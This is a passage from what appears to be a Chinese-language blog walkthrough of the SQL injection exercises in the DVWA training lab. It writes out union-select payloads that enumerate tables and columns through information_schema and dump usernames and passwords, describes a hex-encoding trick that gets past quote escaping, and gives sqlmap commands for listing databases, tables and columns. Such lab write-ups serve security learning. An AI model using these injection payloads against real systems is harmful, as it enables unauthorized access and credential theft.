src="/./../imgs/$%7Bfiilename%7D/image-20230717194051755.png" alt="image-20230717194051755"></p><p>(3)判断回显位置                       union select 1,2#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194102991.png" alt="image-20230717194102991"></p><p> 可以知道回显位置 在这二个地方</p><p>(4)判断数据库                                     union select 1,database()#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194111638.png" alt="image-20230717194111638"></p><p>(5)获取表名          1’  union select 1,group_concat(table_name) from information_schema.tables where 获取字段名 tables_schema&#x3D;database()#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194119408.png" alt="image-20230717194119408"></p><p> (6)获取字段名                  1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194126766.png" alt="image-20230717194126766"></p><p>(7)获取数据    1’ union select user,password from users # </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194134854.png" alt="image-20230717194134854"></p><h2 id="2-medium级别"><a href="#2-medium级别" class="headerlink" title="2.medium级别"></a>2.medium级别</h2><p>(1)判断注入类型     我们可以看到无法输入数字，所以我们进行抓包在bp中进行SQL注入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194148599.png" alt="image-20230717194148599"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194154638.png" alt="image-20230717194154638"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194200875.png" alt="image-20230717194200875"></p><p>我们输入id&#x3D;1’ and ‘1’&#x3D;’1看见报错了，输入id&#x3D;1 and 1&#x3D;1没有报错。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194209446.png" alt="image-20230717194209446"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194224213.png" alt="image-20230717194224213"></p><p>所以注入类型为数字类型 </p><p>(2)判断列数</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194232999.png" alt="image-20230717194232999"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194241218.png" alt="image-20230717194241218"></p><p> 我们知道列数为2列</p><p>（3）判断回显位置   </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194248360.png" alt="image-20230717194248360"></p><p>我们可以知道回显位置是2</p><p>(4)判断数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194256424.png" alt="image-20230717194256424"></p><p>（5）判断表名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194306019.png" alt="image-20230717194306019"></p><p> (6)判断列名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194317083.png" alt="image-20230717194317083"></p><p>我们输入users之后，发现没有如何反应</p><p>通过源代码我们可以知道，发现它对单引号进行了转义，我们采用16进制绕过，得知users的十六进制为 0x75736572</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194324699.png" alt="image-20230717194324699"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194331510.png" alt="image-20230717194331510"></p><p> (7)获取数据</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194337943.png" alt="image-20230717194337943"></p><h2 id="3-high级别"><a href="#3-high级别" class="headerlink" title="3.high级别"></a>3.high级别</h2><p>（1）判断注入类型</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194344722.png" alt="image-20230717194344722"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194355317.png" alt="image-20230717194355317"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194401750.png" alt="image-20230717194401750"></p><p>我们可以知道是字符型注入</p><p>(2)判断列数</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194410107.png" alt="image-20230717194410107"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194420802.png" alt="image-20230717194420802"></p><p>列数为2列，我们可以发现high级别和low级别的步骤是一样的，所以我在这里就不写了，可以参考low级别的步骤就行了</p><h1 id="六-SQL-Injection-Blind"><a href="#六-SQL-Injection-Blind" class="headerlink" title="六.SQL Injection (Blind)"></a>六.SQL Injection (Blind)</h1><p>我们在讲SQL Injection (Blind)之前，先讲一下什么是sqlmap注入。</p><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。目前支持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等。</p><p>Sqlmap采用了以下5种独特的SQL注入技术</p><ol><li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行(即页面返回时间是否增加)来判断</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中</li><li>联合查询注入，在可以使用Union的情况下注入</li><li>堆查询注入，可以同时执行多条语句时的注入</li></ol><p>Sqlmap的强大的功能包括 数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。</p><p>sqlmap是一个跨平台的工具，很好用，是SQL注入方面一个强大的工具！</p><p>我们可以使用 -h 参数查看sqlmap的参数以及用法，sqlmap  -h</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194455930.png" alt="image-20230717194455930"></p><p> sqlmap的使用方法:sqlmap -u  url 是对网站进行注入  </p><p>​            sqlmap -r  是对文件进行注入       </p><p>这里我们对SQL Injection的low级别进行sqlmap，具体过程我写在了图片上面</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194520475.png" alt="image-20230717194520475"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194647852.png" alt="image-20230717194647852"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194700081.png" alt="image-20230717194700081"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194709759.png" alt="image-20230717194709759"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194718055.png" alt="image-20230717194718055"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194725978.png" alt="image-20230717194725978"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194733960.png" alt="image-20230717194733960"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194741766.png" alt="image-20230717194741766"></p><h2 id="1-low级别-1"><a href="#1-low级别-1" class="headerlink" title="1.low级别"></a>1.low级别</h2><p>(1)我们先进行抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194755683.png" alt="image-20230717194755683"></p><p> (2)然后使用sqlmap</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194803594.png" alt="image-20230717194803594"></p><p>(3)爆破数据库              –dbs</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194816445.png" alt="image-20230717194816445"></p><p> (4)爆破表名                             -D ‘dvwa’ –tables</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194840861.png" alt="image-20230717194840861"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194849533.png" alt="image-20230717194849533"></p><p> (5)爆破字段名    -D ‘dvwa’  -T ‘ guestbook’ –columns</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194855590.png" alt="image-20230717194855590"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194909396.png" alt="image-20230717194909396"></p><p> (6)爆破数据</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194918531.png" alt="image-20230717194918531"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194926654.png" alt="image-20230717194926654"></p><p>后面的我们都可以使用sqlmap进行注入,所以后面的就在这里不讲解了。</p><p>本篇文章转载于我的csdn博客:<a href="https://blog.csdn.net/qq_58091216/article/details/124484529?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_58091216/article/details/124484529?spm=1001.2014.3001.5501</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-DVWA介绍&quot;&gt;&lt;a href=&quot;#一-DVWA介绍&quot; class=&quot;headerlink&quot; title=&quot;一.DVWA介绍&quot;&gt;&lt;/a&gt;一.DVWA介绍&lt;/h1&gt;&lt;h2 id=&quot;1-1-DVWA简介&quot;&gt;&lt;a href=&quot;#1-1-DVWA简介&quot; class=&quot;</summary>
      
    
    
    
    <category term="web" scheme="http://ms02423.top/categories/web/"/>
    
    
    <category term="SQL注入" scheme="http://ms02423.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
